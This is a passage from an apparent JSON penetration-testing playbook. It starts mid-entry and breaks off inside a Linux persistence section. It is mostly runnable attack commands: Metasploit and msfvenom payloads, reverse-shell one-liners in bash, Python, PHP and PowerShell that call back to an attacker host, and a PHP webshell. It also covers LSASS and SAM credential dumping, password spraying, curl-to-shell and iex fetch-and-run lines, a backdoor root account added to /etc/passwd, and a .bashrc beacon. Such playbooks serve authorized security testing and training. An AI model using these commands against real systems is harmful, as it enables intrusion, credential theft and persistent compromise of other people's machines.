    "name": "Sanity-test in the lab",
    "steps": [
     {
      "do": "Stand up a disposable listener for callbacks",
      "cmd": "nc -lvnp $LPORT"
     },
     {
      "do": "Dry-run the exploit against a mirrored lab VM",
      "cmd": "python3 exploit.py <IP> --check",
      "note": "Many PoCs expose a check mode"
     },
     {
      "do": "Capture output for the report",
      "cmd": "python3 exploit.py <IP> | tee exploit-run.log"
     }
    ]
   }
  ],
  "verify": "The exploit returns expected proof (version banner, test file, or callback) against a lab replica before live use.",
  "cleanup": "Remove compiled binaries, cloned repos, and copied exploit source from the target and attacker host.",
  "safety": "Review every public exploit for destructive or backdoored code and test against a lab mirror before touching production."
 },
 {
  "id": "metasploit-framework-workflow",
  "title": "Metasploit Framework Workflow",
  "cat": "Exploitation",
  "goal": "Drive an engagement through Metasploit from scanning to post-exploitation.",
  "when": "When a target service matches an available module and a framework-driven workflow is in scope.",
  "risk": "high",
  "tools": [
   "msfconsole",
   "msfvenom",
   "meterpreter"
  ],
  "mitre": [
   "T1210 Exploitation of Remote Services",
   "T1059 Command and Scripting Interpreter",
   "T1055 Process Injection",
   "T1003 OS Credential Dumping"
  ],
  "phases": [
   {
    "name": "Set up workspace and scan",
    "steps": [
     {
      "do": "Launch the console",
      "cmd": "msfconsole -q"
     },
     {
      "do": "Create a per-engagement workspace",
      "cmd": "workspace -a engagement1"
     },
     {
      "do": "Scan into the database with db_nmap",
      "cmd": "db_nmap -sV -sC <IP>"
     },
     {
      "do": "List discovered services",
      "cmd": "services"
     }
    ]
   },
   {
    "name": "Select and configure a module",
    "steps": [
     {
      "do": "Search modules by name or CVE",
      "cmd": "search type:exploit name:smb"
     },
     {
      "do": "Load the chosen exploit",
      "cmd": "use exploit/windows/smb/ms17_010_eternalblue"
     },
     {
      "do": "Review required options",
      "cmd": "show options"
     },
     {
      "do": "Set the target host",
      "cmd": "set RHOSTS <IP>"
     }
    ]
   },
   {
    "name": "Payload and launch",
    "steps": [
     {
      "do": "Choose a staged meterpreter payload",
      "cmd": "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
     },
     {
      "do": "Point the callback at your handler",
      "cmd": "set LHOST $LHOST"
     },
     {
      "do": "Set the listener port",
      "cmd": "set LPORT $LPORT"
     },
     {
      "do": "Run the exploit",
      "cmd": "exploit -j",
      "note": "-j backgrounds the session"
     }
    ]
   },
   {
    "name": "Meterpreter basics",
    "steps": [
     {
      "do": "Confirm host and context",
      "cmd": "sysinfo"
     },
     {
      "do": "Check the current user",
      "cmd": "getuid"
     },
     {
      "do": "Migrate into a stable process",
      "cmd": "migrate -N explorer.exe"
     },
     {
      "do": "Dump local SAM hashes",
      "cmd": "hashdump"
     }
    ]
   },
   {
    "name": "Payload generation and post",
    "steps": [
     {
      "do": "Generate a Windows exe payload",
      "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe"
     },
     {
      "do": "Generate a Linux ELF payload",
      "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf"
     },
     {
      "do": "Catch it with multi/handler",
      "cmd": "use exploit/multi/handler"
     },
     {
      "do": "Run the local privilege-escalation suggester",
      "cmd": "run post/multi/recon/local_exploit_suggester"
     }
    ]
   }
  ],
  "verify": "An interactive session opens, getuid resolves, and post modules return expected host data.",
  "cleanup": "Kill sessions, remove uploaded payloads from the target, and clear the workspace if required by the client.",
  "safety": "Only run modules against in-scope hosts; some exploits (EternalBlue) can crash services, so confirm approval."
 },
 {
  "id": "shells-and-payloads",
  "title": "Shells & Payloads",
  "cat": "Exploitation",
  "goal": "Establish reliable reverse and bind shells and upgrade them to a fully interactive TTY.",
  "when": "After achieving command execution on an authorized target and needing a stable foothold.",
  "risk": "high",
  "tools": [
   "nc",
   "socat",
   "pwncat",
   "msfvenom",
   "python3",
   "powershell"
  ],
  "mitre": [
   "T1059.004 Unix Shell",
   "T1059.001 PowerShell",
   "T1071 Application Layer Protocol",
   "T1105 Ingress Tool Transfer"
  ],
  "phases": [
   {
    "name": "Start a listener",
    "steps": [
     {
      "do": "Open a basic netcat listener",
      "cmd": "nc -lvnp $LPORT"
     },
     {
      "do": "Wrap netcat with rlwrap for history and arrows",
      "cmd": "rlwrap nc -lvnp $LPORT"
     },
     {
      "do": "Use pwncat-cs for auto-upgraded shells",
      "cmd": "pwncat-cs -lp $LPORT"
     },
     {
      "do": "Use a socat listener for a stable TTY handler",
      "cmd": "socat file:`tty`,raw,echo=0 tcp-listen:$LPORT"
     }
    ]
   },
   {
    "name": "Reverse shell one-liners",
    "steps": [
     {
      "do": "Bash reverse shell",
      "cmd": "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
     },
     {
      "do": "Python3 reverse shell",
      "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
     },
     {
      "do": "PHP reverse shell",
      "cmd": "php -r '$s=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
     },
     {
      "do": "PowerShell reverse shell",
      "cmd": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}\""
     }
    ]
   },
   {
    "name": "Bind shells",
    "steps": [
     {
      "do": "Open a netcat bind shell on the target",
      "cmd": "nc -lvnp $LPORT -e /bin/bash"
     },
     {
      "do": "Connect to the bind shell from the attacker",
      "cmd": "nc <RHOST> $LPORT"
     },
     {
      "do": "Use socat for an encrypted bind listener",
      "cmd": "socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/bash"
     }
    ]
   },
   {
    "name": "Generate payload files with msfvenom",
    "steps": [
     {
      "do": "Build a Windows exe",
      "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev.exe"
     },
     {
      "do": "Build a Linux ELF",
      "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev.elf"
     },
     {
      "do": "Build an ASPX webshell payload",
      "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o rev.aspx"
     },
     {
      "do": "Build a WAR for Tomcat",
      "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war"
     }
    ]
   },
   {
    "name": "Upgrade and obfuscate",
    "steps": [
     {
      "do": "Spawn a PTY with python",
      "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
     },
     {
      "do": "Background and fix local terminal modes",
      "cmd": "stty raw -echo; fg",
      "note": "Background with Ctrl-Z first"
     },
     {
      "do": "Export a sane terminal and reset size",
      "cmd": "export TERM=xterm; stty rows 50 cols 200"
     },
     {
      "do": "Drop a PHP webshell for persistence",
      "cmd": "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/s.php"
     },
     {
      "do": "Encode a PowerShell payload to base64",
      "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e cmd/powershell_base64 -f psh -o rev.ps1"
     }
    ]
   }
  ],
  "verify": "The listener receives a connection and the shell survives an interactive command such as 'id' after TTY upgrade.",
  "cleanup": "Remove dropped payloads and webshells from the target and close all listeners.",
  "safety": "Deploy shells and webshells only on hosts explicitly authorized in the engagement scope."
 },
 {
  "id": "offline-password-cracking",
  "title": "Offline Password Cracking",
  "cat": "Credential Access",
  "goal": "Recover plaintext passwords from captured hashes using GPU and CPU crackers.",
  "when": "After obtaining hash material (dumps, captures, /etc/shadow) from an authorized target.",
  "risk": "low",
  "tools": [
   "hashcat",
   "john",
   "hashid",
   "unshadow"
  ],
  "mitre": [
   "T1110 Brute Force",
   "T1110.002 Password Cracking",
   "T1003 OS Credential Dumping",
   "T1003.008 /etc/passwd and /etc/shadow"
  ],
  "phases": [
   {
    "name": "Identify the hash",
    "steps": [
     {
      "do": "Guess the hash format and candidate hashcat/john names",
      "cmd": "hashid -m '<HASH>'",
      "note": "-m prints the matching hashcat mode numbers"
     },
     {
      "do": "Cross-check interactively for ambiguous formats",
      "cmd": "hash-identifier"
     },
     {
      "do": "Inspect sample reference hashes to confirm structure",
      "cmd": "hashcat --example-hashes | grep -iA3 'NTLM'"
     },
     {
      "do": "Count and dedupe the capture before cracking",
      "cmd": "sort -u <HASHFILE> | wc -l"
     }
    ]
   },
   {
    "name": "Prepare shadow and scope hashes",
    "steps": [
     {
      "do": "Merge passwd and shadow into john-crackable records",
      "cmd": "unshadow /etc/passwd /etc/shadow > <HASHFILE>"
     },
     {
      "do": "Isolate a single algorithm to a clean file",
      "cmd": "grep -i '\\$6\\$' <HASHFILE> > sha512.txt",
      "note": "$6$ is sha512crypt"
     },
     {
      "do": "Strip usernames so hashcat sees only hashes",
      "cmd": "cut -d: -f2 <HASHFILE> > hashes.only"
     }
    ]
   },
   {
    "name": "Wordlist and rules with hashcat",
    "steps": [
     {
      "do": "Crack NTLM with rockyou",
      "cmd": "hashcat -m 1000 -a 0 <HASHFILE> /usr/share/wordlists/rockyou.txt"
     },
     {
      "do": "Crack NetNTLMv2 responder captures",
      "cmd": "hashcat -m 5600 -a 0 <HASHFILE> /usr/share/wordlists/rockyou.txt"
     },
     {
      "do": "Amplify the wordlist with best64 rules",
      "cmd": "hashcat -m 1000 -a 0 <HASHFILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
     },
     {
      "do": "Crack slow bcrypt hashes with a focused list",
      "cmd": "hashcat -m 3200 -a 0 <HASHFILE> /usr/share/wordlists/rockyou.txt -w 3"
     },
     {
      "do": "Crack Kerberos AS-REP (18200) or TGS (13100) tickets",
      "cmd": "hashcat -m 18200 -a 0 <HASHFILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
     }
    ]
   },
   {
    "name": "Mask and hybrid attacks",
    "steps": [
     {
      "do": "Brute force an 8-char upper+digit pattern",
      "cmd": "hashcat -m 1000 -a 3 <HASHFILE> '?u?l?l?l?l?l?d?d'"
     },
     {
      "do": "Append digits to dictionary words (hybrid)",
      "cmd": "hashcat -m 1000 -a 6 <HASHFILE> /usr/share/wordlists/rockyou.txt '?d?d?d'"
     },
     {
      "do": "Benchmark a mode to size the keyspace runtime",
      "cmd": "hashcat -b -m 1800"
     }
    ]
   },
   {
    "name": "Crack and review with john",
    "steps": [
     {
      "do": "Crack sha512crypt with explicit format",
      "cmd": "john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt <HASHFILE>"
     },
     {
      "do": "Apply john rule mangling",
      "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo <HASHFILE>"
     },
     {
      "do": "Show already-cracked results from the pot",
      "cmd": "john --show --format=sha512crypt <HASHFILE>"
     },
     {
      "do": "Display hashcat cracked pairs",
      "cmd": "hashcat -m 1000 <HASHFILE> --show"
     }
    ]
   }
  ],
  "verify": "Cracked plaintexts appear via --show and authenticate against the source service in the lab.",
  "cleanup": "Remove hash files, hashcat.potfile, and john.pot copies from the working directory.",
  "safety": "Only crack hashes captured from systems inside your signed engagement scope."
 },
 {
  "id": "online-password-spraying",
  "title": "Online Password & Spraying Attacks",
  "cat": "Credential Access",
  "goal": "Test authentication endpoints with targeted brute force and lockout-aware password spraying.",
  "when": "After enumerating valid usernames and live services on an authorized network.",
  "risk": "high",
  "tools": [
   "hydra",
   "medusa",
   "crackmapexec",
   "kerbrute"
  ],
  "mitre": [
   "T1110.001 Password Guessing",
   "T1110.003 Password Spraying",
   "T1110.004 Credential Stuffing",
   "T1087 Account Discovery"
  ],
  "phases": [
   {
    "name": "Confirm lockout policy first",
    "steps": [
     {
      "do": "Read the domain password policy before any spray",
      "cmd": "crackmapexec smb <IP> -u '<USER>' -p '<HASH>' --pass-pol",
      "note": "Note lockout threshold and observation window"
     },
     {
      "do": "Enumerate users via Kerberos pre-auth",
      "cmd": "kerbrute userenum -d <TARGET> --dc <IP> users.txt"
     },
     {
      "do": "Verify the target service is reachable",
      "cmd": "nc -vz <IP> 445"
     }
    ]
   },
   {
    "name": "Targeted brute force with hydra",
    "steps": [
     {
      "do": "Brute force SSH for one user",
      "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4"
     },
     {
      "do": "Brute force FTP",
      "cmd": "hydra -L users.txt -P passwords.txt ftp://<IP> -f"
     },
     {
      "do": "Attack an HTTP POST login form",
      "cmd": "hydra -l <USER> -P passwords.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'"
     },
     {
      "do": "Brute force RDP cautiously",
      "cmd": "hydra -l <USER> -P passwords.txt rdp://<IP> -t 1"
     }
    ]
   },
   {
    "name": "Alternate cracker with medusa",
    "steps": [
     {
      "do": "Spray SMB with medusa",
      "cmd": "medusa -h <IP> -U users.txt -p 'Spring2026!' -M smbnt"
     },
     {
      "do": "Brute force a single SSH account",
      "cmd": "medusa -h <IP> -u <USER> -P passwords.txt -M ssh -t 4"
     },
     {
      "do": "Target a web form module",
      "cmd": "medusa -h <IP> -U users.txt -P passwords.txt -M http -m DIR:/login"
     }
    ]
   },
   {
    "name": "Lockout-aware spraying",
    "steps": [
     {
      "do": "Spray one password across all users over SMB",
      "cmd": "crackmapexec smb <IP> -u users.txt -p 'Welcome1!' --continue-on-success",
      "note": "One password per window stays under threshold"
     },
     {
      "do": "Spray with nxc and highlight successes only",
      "cmd": "nxc smb <IP> -u users.txt -p 'Autumn2026!' | grep '[+]'"
     },
     {
      "do": "Kerberos spray a single password",
      "cmd": "kerbrute passwordspray -d <TARGET> --dc <IP> users.txt 'Password123!'"
     },
     {
      "do": "Spray LDAP/WinRM to find reusable creds",
      "cmd": "crackmapexec winrm <IP> -u users.txt -p 'Password123!' --continue-on-success"
     }
    ]
   },
   {
    "name": "Validate and pivot",
    "steps": [
     {
      "do": "Confirm a found credential grants shell access",
      "cmd": "crackmapexec smb <IP> -u <USER> -p '<HASH>' -x 'whoami'"
     },
     {
      "do": "List shares readable with the credential",
      "cmd": "crackmapexec smb <IP> -u <USER> -p '<HASH>' --shares"
     },
     {
      "do": "Record working creds to a scoped file",
      "cmd": "echo '<USER>:<HASH>' >> valid-creds.txt"
     }
    ]
   }
  ],
  "verify": "At least one credential authenticates to the target service without triggering account lockout.",
  "cleanup": "Delete captured user and credential lists; notify the client of any accidental lockouts.",
  "safety": "Respect lockout thresholds and only target accounts and services named in the rules of engagement."
 },
 {
  "id": "credential-dumping",
  "title": "Credential Dumping",
  "cat": "Credential Access",
  "goal": "Harvest reusable secrets from Windows and Linux hosts to enable lateral movement and demonstrate credential-exposure impact on an authorized engagement.",
  "when": "After reaching administrator, SYSTEM, or root and you need hashes, plaintext, or keys to pivot or prove exposure.",
  "risk": "high",
  "tools": [
   "mimikatz",
   "pypykatz",
   "impacket-secretsdump",
   "reg",
   "grep"
  ],
  "mitre": [
   "T1003.002 OS Credential Dumping: Security Account Manager",
   "T1003.001 OS Credential Dumping: LSASS Memory",
   "T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow",
   "T1552.001 Unsecured Credentials: Credentials In Files",
   "T1555.004 Credentials from Password Stores: Windows Credential Manager"
  ],
  "phases": [
   {
    "name": "Windows: offline hive extraction",
    "steps": [
     {
      "do": "Save the SAM and SYSTEM hives to disk",
      "cmd": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y"
     },
     {
      "do": "Also grab SECURITY for cached and LSA secrets",
      "cmd": "reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save /y"
     },
     {
      "do": "Parse the hives offline on the attacker box",
      "cmd": "impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL",
      "note": "Yields local NTLM hashes plus LSA secrets and cached domain creds."
     }
    ]
   },
   {
    "name": "Windows: LSASS memory",
    "steps": [
     {
      "do": "Dump LSASS with the signed comsvcs minidump method",
      "cmd": "powershell -c \"$p=(Get-Process lsass).Id; rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $p C:\\Windows\\Temp\\lsass.dmp full\"",
      "note": "Requires SeDebug; file is large, exfil securely."
     },
     {
      "do": "Parse the dump offline with pypykatz",
      "cmd": "pypykatz lsa minidump lsass.dmp",
      "note": "Avoids running an untrusted binary on the target."
     },
     {
      "do": "Or read live LSASS with mimikatz when permitted",
      "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
     }
    ]
   },
   {
    "name": "Windows: DPAPI and stores",
    "steps": [
     {
      "do": "List Credential Manager entries",
      "cmd": "cmdkey /list",
      "note": "Vault entries unlock with DPAPI master keys."
     },
     {
      "do": "Extract DPAPI-protected secrets with mimikatz",
      "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" exit",
      "note": "Harvests master keys to decrypt browser and vault blobs."
     },
     {
      "do": "Pull remote secrets over SMB with valid admin creds",
      "cmd": "impacket-secretsdump <USER>@<TARGET>",
      "note": "Use -hashes for pass-the-hash when only the NTLM is known."
     }
    ]
   },
   {
    "name": "Linux: files and shells",
    "steps": [
     {
      "do": "Grab the password hashes for offline cracking",
      "cmd": "cat /etc/shadow; unshadow /etc/passwd /etc/shadow > hashes.txt",
      "note": "Crack with hashcat -m 1800 hashes.txt wordlist."
     },
     {
      "do": "Collect SSH private keys and known hosts",
      "cmd": "find / -name 'id_*' -o -name 'authorized_keys' -o -name 'known_hosts' 2>/dev/null"
     },
     {
      "do": "Grep config, history, and env files for secrets",
      "cmd": "grep -rinE 'password|passwd|api[_-]?key|secret|token' /home /var/www /opt 2>/dev/null; cat ~/.bash_history"
     },
     {
      "do": "Scrape process memory and command lines for creds",
      "cmd": "ps auxww | grep -iE 'pass|key|token'; for p in /proc/[0-9]*; do strings \"$p/environ\" 2>/dev/null; done | grep -iE 'pass|key|token'"
     }
    ]
   }
  ],
  "verify": "Confirm recovered material is usable: crack or pass-the-hash a dumped hash, or authenticate with a recovered SSH key, against an in-scope host only.",
  "cleanup": "Delete all saved hives and dumps from the target (del C:\\Windows\\Temp\\*.save C:\\Windows\\Temp\\lsass.dmp; rm -f hashes.txt) and store exfiltrated secrets encrypted per the engagement data-handling rules.",
  "safety": "Only on authorized systems; dumped credentials are sensitive client data, so store them encrypted, use them only within scope, and destroy them at engagement close."
 },
 {
  "id": "linux-privilege-escalation",
  "title": "Linux Privilege Escalation",
  "cat": "Privilege Escalation",
  "goal": "Escalate from an unprivileged shell to root on a Linux host by combining automated enumeration with targeted manual misconfiguration checks.",
  "when": "You hold a low-privilege foothold (web shell, SSH, or callback) and need root to meet the authorized engagement objective.",
  "risk": "high",
  "tools": [
   "linpeas",
   "pspy",
   "find",
   "sudo",
   "getcap"
  ],
  "mitre": [
   "T1068 Exploitation for Privilege Escalation",
   "T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
   "T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid",
   "T1053.003 Scheduled Task/Job: Cron",
   "T1611 Escape to Host"
  ],
  "phases": [
   {
    "name": "Stabilize and baseline",
    "steps": [
     {
      "do": "Upgrade to a real PTY so sudo and editors behave",
      "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "note": "Then Ctrl-Z, stty raw -echo; fg, export TERM=xterm."
     },
     {
      "do": "Record the current context and kernel",
      "cmd": "id; hostname; uname -a; cat /etc/os-release"
     },
     {
      "do": "List real users and recent logins as lateral targets",
      "cmd": "awk -F: '$3>=1000{print $1}' /etc/passwd; lastlog 2>/dev/null | grep -v Never"
     }
    ]
   },
   {
    "name": "Automated enumeration",
    "steps": [
     {
      "do": "Run linpeas in memory from the attacker host",
      "cmd": "curl -s http://<IP>/linpeas.sh | sh 2>/dev/null | tee /tmp/.lp.txt",
      "note": "Focus on the RED/YELLOW findings it highlights."
     },
     {
      "do": "Watch for root-run cron and processes with a PID monitor",
      "cmd": "./pspy64 -pf -i 1000",
      "note": "Exposes hidden cron jobs and secrets passed on command lines."
     },
     {
      "do": "Take a second opinion on a quiet host",
      "cmd": "./LinEnum.sh -t -r linenum-report"
     }
    ]
   },
   {
    "name": "Manual high-yield checks",
    "steps": [
     {
      "do": "Enumerate sudo rights and map binaries to GTFOBins",
      "cmd": "sudo -l",
      "note": "NOPASSWD: /usr/bin/find lets you run: sudo find . -exec /bin/sh \\; -quit."
     },
     {
      "do": "Enumerate SUID and SGID binaries",
      "cmd": "find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null"
     },
     {
      "do": "List file capabilities that grant privileged ops",
      "cmd": "getcap -r / 2>/dev/null",
      "note": "cap_setuid+ep on python/perl is a direct root path."
     },
     {
      "do": "Check writable /etc/passwd and inspect cron",
      "cmd": "ls -l /etc/passwd; cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron 2>/dev/null"
     }
    ]
   },
   {
    "name": "Exploit the misconfiguration",
    "steps": [
     {
      "do": "Hijack a PATH-relative command invoked by a root script",
      "cmd": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/<TARGET>; chmod +x /tmp/<TARGET>; export PATH=/tmp:$PATH",
      "note": "After the root run, use /tmp/rootbash -p."
     },
     {
      "do": "Add an admin entry when /etc/passwd is writable",
      "cmd": "openssl passwd -1 -salt x pass123; echo 'r00t:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd; su r00t",
      "note": "Log the exact line for cleanup."
     },
     {
      "do": "Abuse NFS no_root_squash from the attacker host",
      "cmd": "mount -o rw <IP>:/share /mnt && cp /bin/bash /mnt/sh && chown root:root /mnt/sh && chmod +s /mnt/sh",
      "note": "Run /share/sh -p on the target."
     },
     {
      "do": "Escape via docker group membership",
      "cmd": "docker run -v /:/host -it --rm alpine chroot /host /bin/bash",
      "note": "lxd group: import alpine, start a privileged container with /=disk, chroot /mnt/root."
     }
    ]
   },
   {
    "name": "Kernel exploit as last resort",
    "steps": [
     {
      "do": "Match kernel and distro to a known local CVE only after config paths fail",
      "cmd": "uname -r; searchsploit linux kernel privilege",
      "note": "PoCs can panic the box; confirm snapshot and rollback with the client first."
     },
     {
      "do": "Build statically to avoid target toolchain gaps",
      "cmd": "gcc -static exploit.c -o /tmp/.e 2>/dev/null && /tmp/.e",
      "note": "Prefer well-reviewed CVEs such as CVE-2022-0847 or CVE-2021-4034."
     },
     {
      "do": "Check mitigations before trusting a PoC",
      "cmd": "sysctl kernel.yama.ptrace_scope; cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null"
     }
    ]
   }
  ],
  "verify": "Run id and confirm uid=0(root), then read a root-only file such as /etc/shadow to prove the escalation.",
  "cleanup": "Remove dropped SUID shells (rm -f /tmp/rootbash /mnt/sh), delete the injected /etc/passwd line, restore the original PATH and cron artifacts, and unmount any NFS share.",
  "safety": "Only against systems in the authorized scope; kernel PoCs can crash the host, so confirm the client accepts that risk and has a rollback plan first."
 },
 {
  "id": "windows-privilege-escalation",
  "title": "Windows Privilege Escalation",
  "cat": "Privilege Escalation",
  "goal": "Move from a standard Windows user to SYSTEM or local administrator by abusing token privileges, service misconfigurations, and stored credentials.",
  "when": "You hold a shell as a non-admin account and need elevation to pivot or collect objectives on an authorized host.",
  "risk": "high",
  "tools": [
   "winpeas",
   "accesschk",
   "PowerUp",
   "PrintSpoofer/GodPotato",
   "reg"
  ],
  "mitre": [
   "T1068 Exploitation for Privilege Escalation",
   "T1134.001 Access Token Manipulation: Token Impersonation/Theft",
   "T1574.009 Hijack Execution Flow: Path Interception by Unquoted Path",
   "T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control",
   "T1078.003 Valid Accounts: Local Accounts"
  ],
  "phases": [
   {
    "name": "Context and token survey",
    "steps": [
     {
      "do": "Enumerate the current token privileges",
      "cmd": "whoami /priv",
      "note": "SeImpersonate implies the Potato family; SeBackup implies hive copy."
     },
     {
      "do": "Review group membership and integrity level",
      "cmd": "whoami /groups; whoami /all"
     },
     {
      "do": "Record the OS build for exploit matching",
      "cmd": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\""
     }
    ]
   },
   {
    "name": "Automated enumeration",
    "steps": [
     {
      "do": "Run winPEAS for a broad sweep",
      "cmd": "winPEASx64.exe quiet cmd fast",
      "note": "Flags unquoted services, AutoLogon creds, AlwaysInstallElevated, weak ACLs."
     },
     {
      "do": "Run PowerUp checks in memory",
      "cmd": "powershell -ep bypass -c \"iex(iwr http://<IP>/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks\""
     },
     {
      "do": "Run PrivescCheck for a defender-friendly report",
      "cmd": "powershell -ep bypass -c \"Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\""
     }
    ]
   },
   {
    "name": "Service and installer misconfigs",
    "steps": [
     {
      "do": "Find unquoted service paths with spaces",
      "cmd": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"",
      "note": "Place a payload at the first space and restart the service."
     },
     {
      "do": "Test writable service binaries and config with accesschk",
      "cmd": "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *",
      "note": "SERVICE_CHANGE_CONFIG lets you repoint binPath."
     },
     {
      "do": "Check AlwaysInstallElevated on both hives",
      "cmd": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
      "note": "Both =1 means msiexec /quiet /i runs as SYSTEM."
     }
    ]
   },
   {
    "name": "Stored credential hunt",
    "steps": [
     {
      "do": "List saved credentials usable with runas",
      "cmd": "cmdkey /list",
      "note": "Use runas /savecred /user:<USER> cmd."
     },
     {
      "do": "Query the registry for autologon secrets",
      "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword"
     },
     {
      "do": "Search the disk for creds in unattend and config files",
      "cmd": "findstr /si password *.xml *.ini *.config 2>nul & dir /s /b C:\\Windows\\Panther\\* 2>nul"
     }
    ]
   },
   {
    "name": "Elevate to SYSTEM",
    "steps": [
     {
      "do": "Abuse SeImpersonate with a Potato",
      "cmd": "PrintSpoofer64.exe -i -c cmd",
      "note": "On patched or domain hosts use: GodPotato -cmd \"cmd /c whoami\"."
     },
     {
      "do": "Run a reconfigured service as SYSTEM",
      "cmd": "sc config <TARGET> binpath= \"cmd /c net localgroup administrators <USER> /add\" && sc stop <TARGET> && sc start <TARGET>"
     },
     {
      "do": "Inspect privileged scheduled tasks for writable actions",
      "cmd": "schtasks /query /fo LIST /v | findstr /i \"TaskName Run\"",
      "note": "Overwrite a writable task script to inherit its privileges."
     },
     {
      "do": "Note the UAC bypass path only when already an admin-split-token user",
      "cmd": "powershell -ep bypass -c \"Start-Process cmd -Verb RunAs\"",
      "note": "fodhelper/eventvwr registry bypasses apply at medium integrity; skip unless needed."
     }
    ]
   }
  ],
  "verify": "Run whoami in the new shell and confirm nt authority\\system, or confirm your account now appears in net localgroup administrators.",
  "cleanup": "Revert sc config binPath to its original value, remove accounts added to administrators, delete dropped payloads and MSIs, and restore any modified task scripts.",
  "safety": "Only on in-scope hosts with written authorization; Potato techniques and service restarts can disrupt services, so coordinate timing with the client."
 },
 {
  "id": "linux-persistence-backdoors",
  "title": "Linux Persistence & Backdoors",
  "cat": "Persistence",
  "goal": "Establish documented, reversible re-entry to an authorized Linux target so access survives reboots and dropped sessions during the test.",
  "when": "After gaining root or a useful service account and the rules of engagement explicitly permit persistence testing.",
  "risk": "high",
  "tools": [
   "ssh-keygen",
   "crontab",
   "systemctl",
   "useradd"
  ],
  "mitre": [
   "T1098.004 Account Manipulation: SSH Authorized Keys",
   "T1053.003 Scheduled Task/Job: Cron",
   "T1543.002 Create or Modify System Process: Systemd Service",
   "T1136.001 Create Account: Local Account",
   "T1546.004 Event Triggered Execution: Unix Shell Configuration Modification"
  ],
  "phases": [
   {
    "name": "Prepare and record",
    "steps": [
     {
      "do": "Generate a dedicated engagement keypair on the attacker box",
      "cmd": "ssh-keygen -t ed25519 -f ./engage_key -C 'pentest-authorized' -N ''",
      "note": "Keep a written change log of every artifact planted."
     },
     {
      "do": "Confirm the account you will persist as",
      "cmd": "id; whoami"
     },
     {
      "do": "Back up current state for exact restoration",
      "cmd": "crontab -l > /tmp/.cron.bak 2>/dev/null; cp /root/.ssh/authorized_keys /tmp/.ak.bak 2>/dev/null"
     }
    ]
   },
   {
    "name": "Key and shell-profile footholds",
    "steps": [
     {
      "do": "Append your public key to authorized_keys",
      "cmd": "mkdir -p /root/.ssh && echo '<PUBKEY>' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys",
      "note": "Record the exact key fingerprint for removal."
     },
     {
      "do": "Add a login-triggered callback to .bashrc",
      "cmd": "echo '/usr/local/bin/.beacon >/dev/null 2>&1 &' >> /root/.bashrc",
      "note": "Point .beacon at your engagement callback script; note the line verbatim."
     },
     {
      "do": "Verify key login works before relying on it",
      "cmd": "ssh -i ./engage_key root@<TARGET> id"
     }
    ]
   },
   {
    "name": "Scheduled and service footholds",
    "steps": [
     {
